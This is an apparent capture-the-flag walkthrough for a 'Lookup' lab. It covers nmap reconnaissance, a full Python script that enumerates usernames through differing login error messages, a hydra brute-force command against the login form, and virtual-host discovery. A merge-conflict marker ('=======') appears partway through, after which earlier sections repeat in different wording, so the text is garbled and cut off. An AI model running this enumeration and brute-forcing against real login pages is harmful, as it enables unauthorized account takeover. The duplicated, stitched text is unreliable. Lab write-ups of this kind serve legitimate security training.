### Intro
_Lookup_ features real-world vulnerabilities like web app flaws and privilege escalation. It teaches key skills such as reconnaissance, enumeration, command injection, and scripting for automation—offering valuable experience in penetration testing and secure coding practices.
#### Nmap
```bash
nmap -p- -A 10.10.248.120
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-14 22:49 BST
Nmap scan report for ip-10-10-248-120.eu-west-1.compute.internal (10.10.248.120)
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
MAC Address: 02:55:1A:4A:B6:E7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/14%OT=22%CT=1%CU=41006%PV=Y%DS=1%DC=D%G=Y%M=02551A%T
OS:M=68757B71%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms ip-10-10-248-120.eu-west-1.compute.internal (10.10.248.120)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.87 seconds
```

Browsing the IP gives us `We can’t connect to the server at lookup.thm.`, meaning the computer tried to reach the address `http://lookup.thm` but couldn't find or connect to the server. To overcome this issue we need to map the `ip` to `hostname` in `/etc/hosts (a local file where you manually map hostnames to IP addresses)` file because the internal lab domains aren't publicly registered. 

#### Browse the hostname
```bash
lookup.thm
```
- We get a basic login page.

When we try to input some random creds, we get an error message saying `Wrong username or password. Please try again. Redirecting in 3 seconds.` However, when we try default creds like `admin:admin`, we only get `Wrong password. Please try again. Redirecting in 3 seconds.` We can also see that the `HTTP Method: POST` and `Subdirectory: login.php` pop up for a few seconds. We can confirm this by nmap scan.

#### Nmap to Discover the Login Page
```bash
nmap -p80 --script http-enum <IP>
```

Now that we have managed to find the login page, we can try to `brute-force` this page. Before finding passwords we need to find users in the website. One of the users is `admin`, we can confirm that from earlier error message. We can use a Python script to find users.
#### Python Script to Enumerate Users
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import threading
from urllib.parse import urljoin

print_lock = threading.Lock()

def is_valid_user(response):
    invalid_msg = "Wrong username or password. Please try again.<br>Redirecting in 3 seconds."
    return not (response.text.strip() == invalid_msg and len(response.text.strip()) == 74)

def check_username(session, post_url, username_field, password_field, fake_password, username):
    data = {username_field: username, password_field: fake_password}
    try:
        response = session.post(post_url, data=data, timeout=10)
        if is_valid_user(response):
            with print_lock:
                print(f"[+] Valid username: {username}")
    except requests.RequestException:
        pass  # silently ignore errors

def main():
    print("=== User Enumeration (Only Valid Users Output) ===\n")
    base_url = input("Base URL (e.g. http://lookup.thm/): ").strip()
    post_path = input("Login form action path (e.g. login.php): ").strip()
    post_url = urljoin(base_url, post_path)
    username_field = input("Username field name (e.g. username): ").strip()  # The username and password fields can be extracted from 
    password_field = input("Password field name (e.g. password): ").strip()  # the source page under username and password snippets.
    fake_password = input("Fake password to use (e.g. Invalid123!): ").strip()
    wordlist_path = input("Path to username wordlist: ").strip()
    threads = input("Number of threads to use (default 10): ").strip()
    threads = int(threads) if threads else 10

    session = requests.Session()
    try:
        with open(wordlist_path, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    print(f"\n[*] Starting scan with {threads} threads...\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for username in usernames:
            executor.submit(check_username, session, post_url, username_field, password_field, fake_password, username)

if __name__ == "__main__":
    main()
```

We have managed to extract two usernames `admin` and `jose`. Now, it's time to brute-force the password for these users.

#### Brute Force with Hydra
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=jose&password=^PASS^:F=Wrong' -t 32
```

We've managed to crack the password of the user `jose` and the password is `password123`. We now use these credentials to login in but like earlier we get nothing. When we inspect the `Network` tab and login with the creds again, we get a new subdomain `files.lookup.thm`. 

This technique is called `Virtual Hosting`, where multiple domain names are hosted on the same IP. The web server uses the `Host header in the HTTP request` to determine which site to server.

We can map this subdomain to the IP like we did earlier.

#### Map the Subdomain
```bash
sudo vim /etc/hosts
IP     files.lookup.thm
```

Once that is done, refresh the page and we are inside the website. There are a lot of files and we can check all of them. However, 
=======
When we try to input some random creds, we get an error saying `Wrong username or password. Please try again. Redirecting in 3 seconds.` However, when we try default creds like `admin:admin`, we only see the password error and not the username error `Wrong password. Please try again. Redirecting in 3 seconds.` which means that the `admin` is a genuine username.

Next we check the `Network` tab in `Inspect page/Web Developer Tools`.  We can see there's an error saying `Wrong username or password. Please try again. Redirecting in 3 seconds.` We can also see that the `HTTP Method: POST` and `Subdirectory: login.php` popped up for a few second. We can confirm this by nmap scan.

#### Nmap to Discover the Login Page
```bash
nmap -p80 --script http-enum <IP>
```

Now that we have managed to find a login page, we can try to `Brute-Force` this page.

#### Brute Force the Login Page with Hydra
